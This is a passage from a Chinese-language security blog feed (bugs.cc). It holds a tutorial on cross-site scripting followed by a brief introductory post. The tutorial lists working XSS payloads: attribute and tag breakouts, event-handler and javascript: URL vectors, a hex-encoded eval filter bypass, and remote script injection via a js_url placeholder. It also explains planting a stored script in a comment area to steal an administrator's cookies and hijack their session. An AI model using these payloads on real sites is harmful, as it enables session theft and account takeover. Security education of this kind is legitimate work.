alt=""></p><p>这时可以看到我们构造的代码里面有两个<code>&quot;&gt;</code>，第一个”&gt;是为了闭合input标签，所以第二个<code>&quot;&gt;</code>就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？</p><p>这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。</p><p>还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成<code>&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p><p>这时，我们在来试试，页面会发生什么样的变化吧。</p><p><img src="https://i.niupic.com/images/2016/05/30/tgdkGA.png" alt=""></p><p>没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行<code>alert(&#39;xss&#39;)</code>代码。我们来试试看</p><p><img src="https://i.niupic.com/images/2016/05/30/gcQF2g.png" alt=""></p><p>当我点击后，就出现了弹窗，这时我们来看看源代码把</p><p><img src="https://i.niupic.com/images/2016/05/30/wq0ht7.png" alt=""></p><p>第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成</p><ul><li><p>onmousemove 当鼠标移动就触发</p></li><li><p>onload 当页面加载完成后触发</p></li></ul><p>还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。</p><p>别以为就这样结束了，还有一类环境不能用上述的方法，</p><p>那就是如果在<code>&lt;textarea&gt;</code>标签里呢？！或者其他优先级比script高的呢？</p><p>就下面这样</p><p><img src="https://i.niupic.com/images/2016/05/30/xYdH4Z.png" alt=""></p><p>这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入<code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>就可以实现弹窗了。</p><blockquote><h3 id="0×04-过滤的解决办法"><a href="#0×04-过滤的解决办法" class="headerlink" title="0×04 过滤的解决办法:"></a>0×04 过滤的解决办法:</h3></blockquote><p>假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span> 当找不到图片名为1的文件时，执行alert('xss')</div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascrip:alert(</span>'<span class="attr">xss</span>')&gt;</span>s<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 点击s时运行alert('xss')</div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">xss</span>');<span class="attr">height</span>=<span class="string">0</span> <span class="attr">width</span>=<span class="string">0</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span> 利用iframe的scr来弹窗</div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>")&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span> 过滤了alert来执行弹窗</div></pre></td></tr></table></figure><p>等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…)</p><blockquote><h3 id="0×05-xss的利用"><a href="#0×05-xss的利用" class="headerlink" title="0×05 xss的利用:"></a>0×05 xss的利用:</h3></blockquote><p>说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。</p><p>这时我们要插入js代码了，怎么插呢？</p><p>你可以这样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">scr</span>=<span class="string">"js_url"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure><p>也可以这样<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'js_url'</span> /&gt;</span></div></pre></td></tr></table></figure></p><p>各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？</p><p>Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。</p><p>比如我们在网站的留言区输入<code>&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt;</code>当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。</p><p>至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。</p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言&quot;&gt;&lt;a href=&quot;#0×01-前言&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言:&quot;&gt;&lt;/a&gt;0×01 前言:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。&lt;/p&gt;
&lt;p&gt;我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;耗时间&lt;/li&gt;
&lt;li&gt;有一定几率不成功&lt;/li&gt;
&lt;li&gt;没有相应的软件来完成自动化攻击&lt;/li&gt;
&lt;li&gt;前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底&lt;/li&gt;
&lt;li&gt;是一种被动的攻击手法&lt;/li&gt;
&lt;li&gt;对website有http-only、crossdomian.xml没有用&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>第一篇博文</title>
    <link href="http://bugs.cc/2016/05/28/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87/"/>
    <id>http://bugs.cc/2016/05/28/第一篇博文/</id>
    <published>2016-05-28T06:35:25.000Z</published>
    <updated>2016-08-23T16:11:51.737Z</updated>
    
    <content type="html"><![CDATA[<p>我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。</p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://bugs.cc/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
